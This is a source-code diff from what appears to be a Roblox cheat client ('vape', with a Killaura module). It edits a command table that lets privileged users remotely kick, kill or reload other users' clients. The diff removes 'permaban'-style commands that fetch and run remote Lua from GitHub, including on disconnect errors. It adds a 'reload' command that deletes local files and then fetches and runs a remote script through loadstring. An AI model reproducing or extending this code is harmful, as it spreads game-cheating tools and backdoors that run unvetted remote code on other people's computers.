@@ -446,8 +446,13 @@ run(function()
 			return true
 		end
 
-		if arg and lplr.Name:lower():sub(1, arg:len()) == arg:lower() then
-			return true
+		if arg then
+			arg = arg:lower()
+			for _, name in {lplr.Name, lplr.DisplayName} do
+				if name:lower():sub(1, arg:len()) == arg then
+					return true
+				end
+			end
 		end
 
 		return false
@@ -872,26 +877,6 @@ run(function()
 				lplr:Kick(table.concat(args, ' '))
 			end)
 		end,
-		permaban = function()
-			local killaura = vape.Modules.Killaura
-			if killaura and killaura.Enabled then
-				killaura:Toggle()
-			end
-
-			loadstring(game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
-			vape:Clean(guiService.ErrorMessageChanged:Connect(function()
-				local errorCode = guiService:GetErrorCode()
-				if errorCode ~= Enum.ConnectionError.DisconnectLuaKick and errorCode ~= Enum.ConnectionError.DisconnectConnectionLost then
-					loadstring(game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
-				end
-			end))
-		end,
-		permban = function()
-			whitelist.commands.permaban()
-		end,
-		spoofban = function()
-			whitelist.commands.permaban()
-		end,
 		kill = function()
 			if entitylib.isAlive then
 				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
@@ -945,6 +930,18 @@ run(function()
 			else
 				vape:Uninject()
 			end
+		end,
+		reload = function()
+			if isfile('newvape/main.lua') then
+				delfile('newvape/main.lua')
+			end
+			if isfolder('newvape/libraries') then
+				delfolder('newvape/libraries')
+			end
+			if isfolder('newvape/games') then
+				delfolder('newvape/games')
+			end
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/Night5449791/VapeV4ForRoblox/main/NewMainScript.lua', true))()
 		end,
 		void = function()
 			if entitylib.isAlive then
